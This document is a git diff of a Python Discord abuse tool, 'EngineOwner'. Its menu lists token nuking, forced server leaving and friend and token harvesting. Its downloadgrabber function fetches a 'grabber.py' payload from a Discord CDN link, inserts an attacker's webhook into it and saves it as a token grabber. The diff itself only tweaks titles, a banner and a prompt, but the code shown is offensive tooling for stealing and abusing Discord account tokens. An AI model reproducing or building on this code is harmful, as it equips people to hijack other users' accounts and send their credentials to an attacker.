@@ -13,7 +13,6 @@ from tools.flashbang import fucker
 
 title = "EngineOwner ║ github.com/itssnee/engine-owner"
 system("title " + title)
-
 banner = Fore.RED + """
 ___________              .__                ________                             
 \_   _____/ ____    ____ |__| ____   ____   \_____  \__  _  ______   ___________ 
@@ -21,8 +20,6 @@ ___________              .__                ________
  |        \   |  \/ /_/  >  |   |  \  ___/  /    |    \     /   |  \  ___/|  | \/
 /_______  /___|  /\___  /|__|___|  /\___  > \_______  /\/\_/|___|  /\___  >__|   
         \/     \//_____/         \/     \/          \/           \/     \/        v1.0
-                        ╔═════════════════════════╗         ╔═════════════════════════╗
-                        ║  github.com/itssnee     ║         ║   github.com/itssnee    ║
                      ╔═══════════════════════════════╗   ╔═══════════════════════════════╗
                      ║ [1] Nuke Token                ║   ║ [10] Get All Friends          ║  
                      ║ [2] Leave Servers             ║   ║ [11] Get Token Info           ║
@@ -40,8 +37,6 @@ ___________              .__                ________
 option = Fore.RED + "     [>] "
 
 def downloadgrabber(webhook):
-    title2 = "EngineOwner ║ Token Grabber"
-    system("title " + title2)
     url = 'https://cdn.discordapp.com/attachments/1014530090794766482/1014605376471183390/grabber.py'
     r = requests.get(url, allow_redirects=True)
     open('output/grabber.py', 'w', encoding='utf-8').write(r.content.decode().replace("WEBHOOK HERE", webhook))
@@ -82,7 +77,7 @@ def owner():
         token6 = input(Fore.RED + "Token[>] ")
         fucker(token=token6)
     elif lmao == "9":
-        webhook = input(Fore.RED + "Webhook[>] ")
+        webhook = input(Fore.RED + "Webhook link[>] ")
         downloadgrabber(webhook=webhook)
     elif lmao == "18":
         print("                     available tools:")
